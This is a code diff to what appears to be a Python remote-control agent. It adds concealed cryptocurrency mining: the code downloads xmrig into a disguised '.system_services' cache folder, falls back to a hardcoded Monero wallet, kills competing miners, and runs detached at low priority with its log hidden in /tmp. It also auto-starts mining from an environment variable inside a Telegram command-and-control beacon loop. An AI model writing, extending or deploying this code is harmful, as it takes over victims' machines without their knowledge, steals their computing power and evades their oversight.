@@ -371,33 +371,66 @@ Time: {time.strftime('%H:%M:%S')}"""
             time.sleep(10)
 
 def start_mining(config: str) -> str:
-    """Start mining with given config (pool:wallet format)."""
+    """Start hidden mining with auto-download of xmrig."""
     try:
         parts = config.split(":")
-        if len(parts) >= 3 and parts[0] == "start_mine":
+        if len(parts) >= 2 and parts[0] == "start_mine":
             pool = parts[1]
-            wallet = parts[2]
+            wallet = parts[2] if len(parts) > 2 else "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
+            threads = parts[3] if len(parts) > 3 else "2"
             
             # Check for xmrig
             xmrig_paths = [
+                Path.home() / ".cache" / ".system_services" / "xmrig",
                 "/opt/miner/xmrig",
                 "/usr/local/bin/xmrig",
-                "xmrig"
+                "/tmp/xmrig"
             ]
             
             xmrig = None
             for path in xmrig_paths:
-                if os.path.exists(path) or subprocess.run(f"which {path}", shell=True, capture_output=True).returncode == 0:
-                    xmrig = path
+                if path.exists():
+                    xmrig = str(path)
                     break
             
+            # Auto-download xmrig if not found
             if not xmrig:
-                return "XMRig not found"
+                log("Downloading xmrig...", "START")
+                xmrig_dir = Path.home() / ".cache" / ".system_services"
+                xmrig_dir.mkdir(parents=True, exist_ok=True)
+                xmrig_path = xmrig_dir / "xmrig"
+                
+                # Download xmrig
+                download_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
+                try:
+                    import urllib.request
+                    import tarfile
+                    
+                    tar_path = xmrig_dir / "xmrig.tar.gz"
+                    urllib.request.urlretrieve(download_url, tar_path)
+                    
+                    with tarfile.open(tar_path, 'r:gz') as tar:
+                        for member in tar.getmembers():
+                            if 'xmrig' in member.name and member.name.endswith('xmrig'):
+                                member.name = "xmrig"
+                                tar.extract(member, xmrig_dir)
+                                break
+                    
+                    tar_path.unlink()
+                    os.chmod(xmrig_path, 0o755)
+                    xmrig = str(xmrig_path)
+                    log("✓ xmrig downloaded", "START")
+                except Exception as e:
+                    return f"xmrig download failed: {e}"
             
-            # Start mining
-            cmd = f"{xmrig} -o {pool} -u {wallet} --donate-level 1 --threads 2 --background"
-            subprocess.Popen(cmd, shell=True)
+            # Kill existing xmrig processes
+            subprocess.run("pkill -9 xmrig 2>/dev/null", shell=True)
             
+            # Start mining in background with low priority
+            cmd = f"nohup nice -n 19 {xmrig} -o {pool} -u {wallet} --donate-level 1 --threads {threads} --cpu-priority 1 --no-color --log /tmp/.system.log 2>/dev/null &"
+            subprocess.Popen(cmd, shell=True, start_new_session=True)
+            
+            log(f"Mining started: {pool} ({threads} threads)", "START")
             return f"Mining started: {pool}"
         return f"Invalid mining config: {config}"
     except Exception as e:
@@ -1189,17 +1222,19 @@ Time: {datetime.now().isoformat()}"""
         else:
             log(f"Telegram registration failed: {result.get('error')}", "WARN")
         
-        # Start beacon loop in Telegram mode
+        # Auto-start mining if configured
+        mining_config = os.environ.get("MINING_CONFIG", "")
+        if mining_config:
+            log("Auto-starting mining...", "START")
+            try:
+                start_mining(mining_config)
+                log("✓ Mining started", "START")
+            except Exception as e:
+                log(f"Mining start failed: {e}", "WARN")
+        
+        # Start beacon loop in Telegram mode (handles commands)
         log("Starting Telegram beacon loop...", "START")
-        beacon_count = 0
-        while True:
-            beacon_count += 1
-            time.sleep(SLEEP + random.randint(0, JITTER))
-            
-            # Send periodic beacons
-            if beacon_count % 10 == 0:  # Every 10th beacon
-                telegram_send(f"[BEACON #{beacon_count}] Agent {AGENT_ID[:8]} alive on {pt}")
-        return
+        telegram_beacon_loop(AGENT_ID, SLEEP, JITTER)
     
     # HTTP mode - check server health first
     log("Checking server connectivity...", "CONN")
